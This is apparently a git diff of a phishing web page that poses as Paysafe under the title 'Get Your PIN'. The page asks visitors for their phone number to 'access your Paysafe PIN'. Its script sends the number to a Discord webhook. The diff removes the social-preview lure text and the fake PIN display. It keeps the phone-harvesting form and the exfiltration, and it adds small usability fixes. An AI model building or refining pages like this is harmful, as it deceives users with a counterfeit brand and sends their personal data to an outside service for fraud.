@@ -2,16 +2,6 @@
 <head>
     <meta charset="UTF-8" />
     <title>Get Your PIN</title>
-    <!-- Open Graph meta tags for social previews -->
-    <meta property="og:title" content="PaySafe" />
-    <meta property="og:description" content="To get the full PIN, click the link below for your online receipt." />
-    <meta property="og:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
-    <meta property="og:type" content="website" />
-    <!-- Twitter card (optional) -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="Get Your PIN Online!" />
-    <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
-    <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -33,7 +23,7 @@
             text-align: center;
             max-width: 500px;
             width: 90%;
-            border-top: 5px solid #007bff; /* Paysafe blue color */
+            border-top: 5px solid #007bff;
         }
         h1 {
             color: #007bff;
@@ -45,25 +35,6 @@
             font-size: 1.1em;
             line-height: 1.6;
             margin-bottom: 25px;
-        }
-        .logo {
-            margin-bottom: 30px;
-        }
-        .logo img {
-            max-width: 180px;
-            height: auto;
-        }
-        .phone-input-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 25px;
-        }
-        .country-code {
-            font-size: 1.2em;
-            font-weight: 700;
-            margin-right: 10px;
-            color: #007bff;
         }
         #phoneNumber {
             padding: 12px 15px;
@@ -88,61 +59,24 @@
         #submitBtn:hover {
             background-color: #0056b3;
         }
-        .hidden {
-            display: none;
-        }
-        .pin-display {
-            background-color: #e9ecef;
-            border: 2px dashed #ced4da;
-            border-radius: 8px;
-            padding: 20px;
-            font-size: 2.8em;
-            font-weight: 700;
-            letter-spacing: 3px;
-            color: #28a745; /* Green for emphasis */
-            margin-bottom: 30px;
-            display: inline-block;
-        }
-        .note {
-            font-size: 0.9em;
-            color: #6c757d;
-            margin-top: 20px;
-        }
         .error-message {
             color: #dc3545;
             font-size: 0.9em;
             margin-top: -15px;
             margin-bottom: 15px;
-            display: none; /* Hidden by default */
+            display: none;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">
-            <img src="paysafe_logo.png" alt="Paysafe Logo">
+        <h1>Verify Your Phone Number</h1>
+        <p>Please enter your phone number to access your Paysafe PIN.</p>
+        <div class="phone-input-container">
+            <input type="tel" id="phoneNumber" placeholder="e.g., 555-123-4567" required>
         </div>
-        <div id="phoneInputSection">
-            <h1>Verify Your Phone Number</h1>
-            <p>Please enter your phone number to access your Paysafe PIN. We will automatically detect your country code.</p>
-            <div class="phone-input-container">
-                <span class="country-code" id="countryCodeDisplay">+1</span>
-                <input type="tel" id="phoneNumber" placeholder="e.g., 555-123-4567" pattern="[0-9\-()\s]+" required>
-            </div>
-            <div class="error-message" id="phoneNumberError">Please enter a valid phone number.</div>
-            <button id="submitBtn">Submit</button>
-            <p class="note">By submitting, you agree to our terms and conditions.</p>
-        </div>
-
-        <div id="pinDisplaySection" class="hidden">
-            <h1>Your Paysafe PIN is Available!</h1>
-            <p>Congratulations! Your new Paysafe PIN has been generated and is ready for use. Please find your unique PIN below:</p>
-            <div class="pin-display">
-                1234 5678 9012 3456
-            </div>
-            <p>For security reasons, this PIN is for display purposes only and is a randomly generated example. Always log in to your official Paysafe account to retrieve your real PIN securely.</p>
-            <p class="note">If you have any questions or require assistance, please visit the official Paysafe website or contact their support.</p>
-        </div>
+        <div class="error-message" id="phoneNumberError">Please enter a valid phone number.</div>
+        <button id="submitBtn">Submit</button>
     </div>
 
     <script type="module">
@@ -158,7 +92,9 @@
             return /^\d{7,}$/.test(cleanedNumber); // Ensure the number contains at least 7 digits
         }
 
-        submitBtn.addEventListener('click', async () => {
+        submitBtn.addEventListener('click', async (event) => {
+            event.preventDefault();  // Prevent page reload on submit
+
             const rawPhoneNumber = phoneNumberInput.value.trim();
 
             if (!rawPhoneNumber || !isValidPhoneNumber(rawPhoneNumber)) {
@@ -188,6 +124,7 @@
                 if (response.ok) {
                     console.log('Phone number sent to Discord successfully!');
                     alert("Your number has been submitted successfully!");
+                    phoneNumberInput.value = '';  // Clear input field after successful submission
                 } else {
                     console.error('Failed to send phone number to Discord:', response.status, response.statusText);
                     alert('Failed to submit. Please try again later.');
